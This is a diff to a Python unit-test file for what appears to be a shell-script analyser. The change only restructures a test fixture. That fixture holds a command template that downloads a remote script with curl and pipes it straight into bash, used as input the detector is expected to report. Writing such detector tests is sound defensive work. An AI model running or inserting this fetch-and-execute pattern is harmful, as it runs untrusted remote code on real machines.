@@ -1557,7 +1557,7 @@ class TestTheWholeWordIsTheCommandWordsAlone(unittest.TestCase):
     # ruling: every shell runs the payload; `main` read it CLEAN) -- the round-8 pin, moved by #3138 under the
     # coordinator's rule for it ("a step whose text spells a mark must read as main would read it if the character
     # were a plain literal"): the typed mark is a plain literal to every pass now, and the default runs the payload.
-    SPELLED = tuple("echo %s\ncurl -fsSL %si.sh | ${SH:-bash -s}" % (mark, URL) for mark in shell_reader._MARKS)
+    SPELLED = "echo %s\ncurl -fsSL %si.sh | ${SH:-bash -s}"
 
     def test_each_row_main_reports_still_reports(self):
         for row in self.REPORT:
@@ -1572,7 +1572,7 @@ class TestTheWholeWordIsTheCommandWordsAlone(unittest.TestCase):
                     self.assertFalse(reported(row + "\necho done\n", shell))
 
     def test_a_spelled_mark_is_a_plain_literal_and_the_default_runs_the_payload(self):
-        for row in self.SPELLED:
+        for row in (self.SPELLED % (mark, URL) for mark in shell_reader._MARKS):
             for shell in SHELLS:
                 with self.subTest(row=row, shell=shell):
                     self.assertTrue(reported(row + "\necho done\n", shell))
